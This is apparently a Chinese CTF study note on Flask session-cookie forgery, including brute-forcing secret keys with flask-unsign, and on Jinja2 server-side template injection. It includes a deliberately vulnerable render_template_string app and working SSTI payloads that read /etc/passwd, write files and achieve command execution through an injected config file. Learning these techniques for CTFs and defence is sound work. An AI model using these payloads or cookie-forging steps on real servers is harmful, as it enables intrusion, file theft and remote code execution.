# [CTF] Flask 系列 
本篇會逐一介紹CTF中Flask 相關應用
(日後會持續更新)
# Flask Session 偽造

## :memo: 簡介

flask中的session是存放在cookie中，因此cookie中的字段在客戶端訪問時是可以被修改的，也就是說存在竄改偽造的問題。

### :rocket: **補充**
1. php的session是存放在服務器中。
2. django的session可以存放在數據庫中，也可以以文件形式存放在服務器中。

## 範例

```python=
from flask import session
session['user'] = 'miku'
```

client端的cookie能看到
```js=
session=eyJ1c2VyIjoidG9tIn0.XzVf_w.Is2SqC_MS8NIBynok5BQpmldBLI
```
結構入下圖，共有三個部分，通過.隔開的3段內容
1. session Data
1. TimeStep
1. Cryptographic Hash
![](https://i.imgur.com/uA9TuhJ.png)

### Session Data
第一段其實就是base64 encode(編碼，非加密)後的內容，但去掉了填充用的等號，若decode失敗，自己需要補上1-3個等號補全。
通常會以字典的方式存放相關訊息，在伺服器端則解碼獲取相應訊息。
```
{'user':'miku'}
```
### TimeStep
中間內容為時間戳，在flask中時間戳若超過31天則視為無效。

### Cryptographic Hash
最後一段則是==安全簽名==，將session data、時間戳以及flask的==secretkey==通過==sha1==運算的結果。
secretkey通常在伺服器寫法如下:
```python==
from flask import Flask, session

app = Flask(__name__)
app.config['SECRET_KEY'] = 'my secretkey'
```

而有時候會將secretkey放在環境變數裡，寫法如下:
```python=
app.secret_key = os.getenv('FLASK_KEY')
```

服務端每次收到cookie後，會將cookie中前兩段取出和secretkey做sha1運算，若結果與cookie第三段不一致則視為無效。

## 小總結
我們若能得知伺服器端的secretkey與伺服器端對於session Data的判斷方式就可以利用flask偽造工具，進行session的偽造。
#### session Data的判斷方式例子
>解CTF時可以在他的source code找出貓膩
```python=
### redpwn 2021 web/cool ###
if session['username'] == 'ginkoid':
        return send_file(
            'flag.mp3',
            attachment_filename='flag-at-end-of-file.mp3'
        )
```
### flask偽造工具-1
[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)

**Encode**
```
usage: flask_session_cookie_manager{2,3}.py encode [-h] -s <string> -t <string>

optional arguments:
  -h, --help            show this help message and exit
  -s <string>, --secret-key <string>
                        Secret key
  -t <string>, --cookie-structure <string>
                        Session cookie structure
```

**Decode**
```
usage: flask_session_cookie_manager.py decode [-h] [-s <string>] -c <string>

optional arguments:
  -h, --help            show this help message and exit
  -s <string>, --secret-key <string>
                        Secret key
  -c <string>, --cookie-value <string>
                        Session cookie value

```

### :rocket: **補充**
伺服器端要取得session值在flask中，可以直接使用session['key']取得其value。像是取字典的鍵值方式。

### flask偽造工具-2
利用自動化工具從Github中爬取secretkey字典，因為Github肯定是有最多secretkey的地方，大多數人也不會專門去修改secretkey。

**安裝**
```
pip install flask-unsign[wordlist]
```
**使用方式**
```
flask-unsign --unsign --server [url] #自動取指定url所回應的session cookie並且比對字典暴力破解secretkey
flask-unsign --unsign --cookie [cookie-sign] #對已經過簽名的cookie值進行暴力破解secretkey
```
```
flask-unsign --sign --cookie "{'key':'value'}" --secret "'my secret'" #對指定的session data 進行簽名
```
:Warning: 要注意--secret "'my secret'" 要用" "包起'字串'

![](https://i.imgur.com/O073fZN.png)

<!-- ### 相關文章
* https://www.secpulse.com/archives/97707.html
* https://zhuanlan.zhihu.com/p/192715889
* https://zhuanlan.zhihu.com/p/34936378
 -->
:::info
:pushpin: **TODO**
- [ ] 補充避免Flask Session 偽造方式
- [ ] 相關參考資料
- [ ] 更完善說明
:::
<!-- cookie session不同處 flask 是session cookie?? -->

---

# SSTI（Server-Side Template Injection, 服務器端模板注入
此處將解說關於Flask的SSTI

## :memo: 簡介
當前使用的一些框架，比如python的flask、php的tp、java的spring等一般都採用成熟的的MVC的模式，用戶的輸入先進入Controller控制器，然後根據請求類型和請求的指令發送給對應Model業務模型進行業務邏輯判斷，數據庫存取，最後把結果返回給View視圖層，經過模板渲染展示給用戶。

漏洞成因就是服務端接收了用戶的惡意輸入以後，未經任何處理就將其作為Web 應用模板內容的一部分，模板引擎在進行目標編譯渲染的過程中，執行了用戶插入的可以破壞模板的語句，因而可能導致了敏感信息洩露、代碼執行、GetShell 等問題。其影響範圍主要取決於模版引擎的複雜性。

凡是使用模板的地方都可能會出現SSTI 的問題，SSTI 不屬於任何一種語言，沙盒繞過也不是，沙盒繞過只是由於模板引擎發現了很大的安全漏洞，然後模板引擎設計出來的一種防護機制，不允許使用沒有定義或者聲明的模塊，這適用於所有的模板引擎。

[參考連結](https://www.cnblogs.com/bmjoker/p/13508538.html)

## SSTI for Python
python常見的模板有：Jinja2

### Jinja2
<!-- Jinja2是一種面向Python的現代和設計友好的模板語言，它是以Django的模板為模型的 -->
Jinja2是為python提供的一個功能齊全的模板引擎。簡單來說，就是叫 Python 幫我們寫 HTML 5 的程式碼。
而==Jinja2是Flask框架的一部分==。Jinja2會把模板參數提供的相應的值替換了{{…}}塊。{{…}}是一種特殊的佔位符，告訴模版引擎這個位置的值從渲染模版時使用的數據中獲取。
```htmlmixed=
<html>
  <head>
    <title>{{title}}</title>
  </head>
 <body>
      <h1>Hello, {{user.name}}!</h1>
  </body>
</html>
```

Jinja2 模板同樣支持控制語句，像在{%…%} 塊中，下面舉一個常見的使用Jinja2模板引擎for語句循環渲染一組元素的例子：
```htmlmixed=
<ul>
     {% for comment in comments %}
         <li>{{comment}}</li>
     {% endfor %}
</ul>
```

## 範例
有了剛剛的想法來看個簡單的例子。下面是一個簡單的flask API的服務
```python=
from flask import Flask, render_template_string, request

app = Flask(__name__)
app.secret_key = "hello world"

@app.route('/', methods=['GET', 'POST'])
@app.route('/index', methods=['GET', 'POST'])
def test():
    template = '''
        <h3>hello world</h3>
        <div>
            <h3>%s</h3>
        </div>
    ''' % (request.args.get("search"))

    return render_template_string(template)


if __name__ == '__main__':
    app.debug = True
    app.run()
```
<!--  template = '''
        <div>
            <h3>%s</h3>
        </div>
    ''' % (request.args.get("a"))
與render_template_string()的問題，有不同寫法?? -->
在經典的SSTI中，漏洞是使用了render_template_string() 使用了"%s"或.format()來替換字串。
Jinja2渲染資訊到前端時，會將 {{...}} 裡面的內容作解析，而flask使用了Jinja2作為模板渲染引擎，因此輸入如 {{ 7+7 }} 時，就會被解析成14。
<!-- {{}}中間要空白?? -->

### 不專業POC說明
由上面的source code可以看見當網頁進入/index時會以GET方式請求(當在網址欄輸入URL都是以GET方式請求)，並且會在URL後附帶GET參數?search=。
```
http://127.0.0.1:5000/?search={{7*7}}
```
![](https://i.imgur.com/m7dhP3B.png)

而search參數後面的值會同時反應到template字串中的%s，所以可以利用在參數後傳入模板塊{{...}}，就可以達到注入的效果。若傳入相關的惡意程式碼，則有機會達到RCE攻擊或獲取伺服器相關訊息。
* Dump all used classes
`{{ ''.__class__.__mro__[2].__subclasses__() }}`


* Read File
`{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`

* Write File
`{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`

* RCE
`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
    * evil config
`{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
    * load config
`{{ config['RUNCMD']('cat flag',shell=True) }}`

[WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet#flaskjinja2)
:::info
:pushpin: **TODO**
- [ ] 補充進階注入方式
:::
